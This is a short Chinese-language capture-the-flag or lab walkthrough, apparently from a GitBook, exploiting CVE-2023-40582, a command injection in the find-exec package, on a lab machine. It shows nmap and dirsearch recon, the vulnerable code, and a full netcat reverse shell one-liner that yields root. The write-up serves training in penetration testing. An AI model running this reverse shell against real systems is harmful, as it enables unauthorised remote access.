---
description: Easy -Linux /
---

# ✔️ CVE-2023-40582

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描，获取到2个开放端口：22和3000

```bash
nmap -sC -sV -p- -oA cve40582 192.168.183.36 --open
```

<figure><img src="../../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>

* 检查3000端口上的内容，发现是一个命令猜测游戏的网页，这意味着可以输入命令行：

<figure><img src="../../.gitbook/assets/2.png" alt=""><figcaption></figcaption></figure>

* 枚举3000端口上的隐藏文件/目录，找到3个隐藏文件依次查看：

```bash
dirsearch -u http://192.168.149.36:3000 -x 404,403,401,302,301
```

<figure><img src="../../.gitbook/assets/3.png" alt=""><figcaption></figcaption></figure>

* 其中/server.js文件中，有问题的地方是调用了`find-exec`，它会尝试在系统$PATH变量中查找可执行的命令，这意味着可能可以执行一些不安全的命令，如：`rm` / `curl` / ...从而引发**命令注入漏洞**：

<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 从首页提供的信息中得知，当前目标系统中使用的`find-exec`是v1.0.2版本，因此适用于该漏洞
* CVE-2023-40582 Find-Exec 中的命令注入漏洞PoC：

```javascript
const findExec = require('find-exec');
const command = findExec([req.query.command]);
```

### 漏洞利用

* 因此此处可以拼接命令，所以构造反弹shell命令如下：

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.244 4444 >/tmp/f
# 监听：
nc -lvnp 4444
```

### ROOT

* 直接获取到拥有root权限的shell：

<figure><img src="../../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>

* 获取到proof.txt文件中的内容：

<figure><img src="../../.gitbook/assets/6 (36).png" alt=""><figcaption></figcaption></figure>
